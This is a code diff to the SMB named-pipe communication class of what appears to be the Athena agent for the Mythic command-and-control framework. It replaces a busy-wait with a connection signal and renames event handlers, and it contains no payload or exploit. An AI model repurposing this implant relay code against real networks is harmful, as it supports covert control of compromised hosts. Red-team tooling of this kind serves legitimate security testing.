@@ -44,6 +44,7 @@ namespace Athena.Config
         public PSKCrypto crypt { get; set; }
         public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
+        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
 
         public Smb(string uuid, MythicConfig config)
         {
@@ -56,13 +57,13 @@ namespace Athena.Config
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<string>(this.pipeName);
-            this.serverPipe.ClientConnected += (o, args) => DoNewConnection();
-            this.serverPipe.ClientDisconnected += (o, args) => DoClientDisconnect();
-            this.serverPipe.MessageReceived += (sender, args) => DoMessageReceive(args);
+            this.serverPipe.ClientConnected += (o, args) => OnClientConnection();
+            this.serverPipe.ClientDisconnected += (o, args) => OnClientDisconnect();
+            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
             this.serverPipe.StartAsync();
         }
 
-        private async void DoMessageReceive(ConnectionMessageEventArgs<string> args)
+        private async void OnMessageReceive(ConnectionMessageEventArgs<string> args)
         {
             try
             {
@@ -82,22 +83,26 @@ namespace Athena.Config
             onEventHappenedSignal.Set(); //Indicate something happened
         }
 
-        public async void DoNewConnection()
+        public async void OnClientConnection()
         {
+            onClientConnectedSignal.Set();
             this.connected = true;
         }
 
-        public async void DoClientDisconnect()
+        public async void OnClientDisconnect()
         {
             this.connected = false;
             onEventHappenedSignal.Set(); //Indicate something happened
+            onClientConnectedSignal.Reset();
         }
 
         //Send, wait for a response, and return it to the main functions
         public async Task<string> Send(object obj)
         {
-            //Wait for connection to become available
-            while (!connected) { };
+            if (!connected) 
+            {
+                onClientConnectedSignal.WaitOne();
+            }
 
             try
             {
@@ -122,6 +127,7 @@ namespace Athena.Config
                 await this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm)); //Write our output
 
                 //Wait for a signal
+
                 onEventHappenedSignal.WaitOne();
 
                 if (!connected) //Our event was a client disconnect
@@ -131,7 +137,7 @@ namespace Athena.Config
                 }
                 else //Our event was a new message
                 {
-                    if(this.queueIn.Count > 0) //Check if we actually got a message
+                    if (this.queueIn.Count > 0) //Check if we actually got a message
                     {
                         dm = this.queueIn.Take(); //Take a value from it
 
